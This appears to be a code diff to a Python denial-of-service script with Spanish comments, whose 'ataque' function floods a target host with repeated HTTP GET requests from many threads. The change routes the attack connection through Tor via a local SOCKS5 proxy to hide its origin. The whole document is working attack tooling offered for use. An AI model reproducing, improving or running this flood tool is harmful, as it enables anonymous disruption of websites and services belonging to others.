@@ -3,6 +3,7 @@
 import sys
 import threading
 import requests
+import socks
 import socket
 import re
 
@@ -51,20 +52,19 @@ def manejar_parametros():
 
 
 # Esta funcion perpetra el ataque y es asociada con cada hilo, por lo que cada hijo ejecuta esta funcion.
-def ataque(id):
+def ataque(id, client):
 
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    client.connect((url,puerto))
+
 
     mensaje = "GET / HTTP/1.1\r\nHost: " + url + "\r\n\r\n"
 
     for i in range(cantidad_repeticiones):
 
-        client.send(mensaje.encode('utf-8'))
+        client.sendall(mensaje.encode('utf-8'))
         print("Hilo %10d solicitando por %10d vez." % (id+1, i+1))
 
 
-    # Este codig sirve, solo que no con coneccion por sockets y protocolo TCP, usa requests de python.
+    # Este codig sirve, solo que no con coneccion por sockets y protocolo TCP, usa requests de python
     """
     session = requests.session()
     session.proxies = {}
@@ -84,11 +84,11 @@ def ataque(id):
 
 
 # Funcion que inserta en la variable global hilos cada hilo con su respectivo objetivo.
-def crear_hilos():
+def crear_hilos(client):
     global hilos
     for i in range(cantidad_hilos):
 
-        h = threading.Thread(target = ataque, args = (i,))
+        h = threading.Thread(target = ataque, args = (i,client,))
         hilos.append(h)
 
 # Funcion que aplica .start() cada hilo de la lista.
@@ -100,6 +100,20 @@ def iniciar_ataque():
 
 if __name__ == '__main__':
 
+
+    # Setea el proxy que se va a usar.
+    # Este es por el cual se conecta TOR.
+    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050, True)
+    client = socks.socksocket()
+
     manejar_parametros()
-    crear_hilos()
+
+
+    try:
+        client.connect((url,puerto))
+    except Exception as e:
+        print (str(e))
+        sys.exit()
+
+    crear_hilos(client)
     iniciar_ataque()
